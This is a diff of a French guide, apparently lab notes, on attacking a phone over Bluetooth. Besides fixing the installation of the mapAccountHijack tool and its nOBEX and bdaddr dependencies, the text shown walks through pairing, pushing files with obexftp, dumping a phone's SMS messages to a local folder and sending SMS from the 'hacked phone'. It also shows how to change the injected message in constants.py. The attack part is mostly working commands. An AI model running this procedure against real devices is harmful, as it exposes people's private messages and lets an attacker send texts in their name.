@@ -103,7 +103,9 @@ Un message **Confirm passkey** va s'afficher sur l'écran et il faudra répondre
 
 Un fois la connexion faite, nous avons pu transférer un fichier via `obexftp`
 
-`obexftp --nopath --noconn --uuid none --bluetooth <MAC_bluetooth> --channel 9 --put <chemin/vers/fichier>`
+```
+obexftp --nopath --noconn --uuid none --bluetooth <MAC_bluetooth> --channel 9 --put <chemin/vers/fichier>
+```
 
 On devrait avoir un résultat comme celui-ci : 
 
@@ -120,11 +122,11 @@ Ce test a été fait entre 1 PC sous Kali Linux et un Samsung Galaxy S10. On a d
 Voici la liste des commandes exécutées :
 
 ```
-bluetoothctl
-discoverable on
-agent on 
-default-agent
-pair <MAC_bluetooth>
+1. bluetoothctl
+2. discoverable on
+3. agent on 
+4. default-agent
+5. pair <MAC_bluetooth>
 ```
 Un message **Confirm passkey** va s'afficher sur l'écran et il faudra répondre `yes`
 
@@ -194,10 +196,72 @@ Cependant, j'ai rencontré des problèmes donc je vais mettre ici les commande q
 sudo apt-get install python3-venv
 git clone https://github.com/sgxgsx/mapAccountHijack.git
 cd mapAccountHijack
-python3 -m venv venv
+python3 -m venv .venv
 source venv/bin/activate
+```
 
+Le probleme est arrivé sur les commandes suivantes : 
+```
+chmod +x install.sh
+sudo ./install.sh
+```
 
+Donc on passe l'étape ci-dessus et on active l'environnement python : 
+```
+source ${tool_installation_path}.venv/bin/activate
+```
+
+Ici, on va régler l'erreur suivante : 
+```
+python3 mapAccountHijack.py --help
+Traceback (most recent call last):
+  File "/home/user/Bureau/bluetooth/mapAccountHijack/mapAccountHijack.py", line 3, in <module>
+    from mapfunctions import MAPFunctions
+  File "/home/user/Bureau/bluetooth/mapAccountHijack/mapfunctions.py", line 18, in <module>
+    import aiohttp
+ModuleNotFoundError: No module named 'aiohttp'
+```
+
+Ici, c'est un problème d'arborescence, donc on fait : 
+```
+cd nOBEX
+sudo mv * ../
+sudo mv nOBEX ../nOBEX2
+cd ../
+ls nOBEX2 #Pour vérifier la présence des fichier
+sudo rm -r nOBEX
+mv nOBEX2/ nOBEX
+```
+
+Pour revenir sur l'erreur du fichier `install.sh`, on va le supprimer et **recréer** un fichier *install.sh* dans lequel on va mettre le code suivant : 
+```
+#!/bin/bash
+set -e
+
+echo "[+] Dépendances Python"
+python3 -m pip install aiohttp
+
+echo "[+] nOBEX"
+if [ ! -d "nOBEX" ]; then
+    git clone https://github.com/nccgroup/nOBEX.git
+else
+    echo "nOBEX déjà présent"
+fi
+
+echo "[+] bdaddr"
+if [ ! -d "bdaddr" ]; then
+    git clone https://github.com/thxomas/bdaddr
+fi
+
+cd bdaddr
+make
+cd ..
+
+echo "[✓] Installation terminée"
+```
+
+Ensuite, on donne les droits au fichier : 
+```
 chmod +x install.sh
 sudo ./install.sh
 ```
@@ -211,7 +275,9 @@ De base :
 `ExecStart=/usr/libexec/bluetooth/bluetoothd`
 
 On remplace par :  
-`ExecStart=/usr/libexec/bluetooth/bluetoothd --compat`
+```
+ExecStart=/usr/libexec/bluetooth/bluetoothd --compat
+```
 
 Puis on tape : 
 ```
@@ -219,48 +285,34 @@ sudo service bluetooth stop
 sudo systemctl daemon-reload
 sudo service bluetooth start
 sudo hciconfig -a hci0 reset
-
-source ${tool_installation_path} venv/bin/activate
 ```
 
-C'est à partir d'ici que j'ai eu des erreurs. Donc j'ai fait : 
+On peut voir les options avec : 
+``` 
+python3 mapAccountHijack.py --help
 ```
-chmod -R u+rw nOBEX
-sudo chmod -R u+rw nOBEX
-rm -rf nOBEX.egg-info
-pip install ./nOBEX
-sudo chown -R $USER:$USER ./nOBEX
-
-sudo apt install python3-xyz
-
-sudo service bluetooth stop
-sudo systemctl daemon-reload
-sudo service bluetooth start
-sudo hciconfig -a hci0 reset
-
-pip install aiohttp
-```
-
-On peut voir les options avec :  
-`python3 mapAccountHijack.py --help`
 
 On peut récupérer les messages d'un téléphone avec la commande :
-`python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out`
+```
+python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out
+```
 
 Exemple de message capturé : 
-<img width="1113" height="389" alt="message_sniff" src="https://github.com/user-attachments/assets/2478b2aa-cf89-427e-b37d-4b9aab262dc0" />
+<img width="1113" height="389" alt="message_sniff" src="https://github.com/user-attachments/assets/60d5570e-3d81-4b2d-9ed4-32489c668562" />
 
 On peut à la fois récupérer les messages et envoyer un SMS avec le téléphone piraté : 
-`python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out --phone-number <Num_Tel>`
+```
+python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out --phone-number <Num_Tel>
+```
 
-On peut changer le message envoyé par le téléphone piraté en modifiant le fichier constants.py. On a cette fonction de base : 
+On peut changer le message envoyé par le téléphone piraté en modifiant le fichier **constants.py**. On a cette fonction de base : 
 ```
 def get_SMS_MESSAGE_END():
     return b"\r\nEND:VCARD\r\n"  + b"BEGIN:BBODY\r\nCHARSET:UTF-8\r\nENCODING:8bit\r\nLENGTH:40\r\nBEGIN:MSG\r\nThis is a new msg!\r\nEND:MSG\r\n" + b"END:BBODY\r\nEND:BENV\r\nEND:BMSG\r\n"
     
 ```
 
-Et on peut remplacer le message par "Un message de test pour GIT!" : 
+Et on peut remplacer le message par "*Un message de test pour GIT!*" : 
 ```
 def get_SMS_MESSAGE_END():
     return b"\r\nEND:VCARD\r\n"  + b"BEGIN:BBODY\r\nCHARSET:UTF-8\r\nENCODING:8bit\r\nLENGTH:40\r\nBEGIN:MSG\r\nUn message de test pour GIT!\r\nEND:MSG\r\n" + b"END:BBODY\r\nEND:BENV\r\nEND:BMSG\r\n"
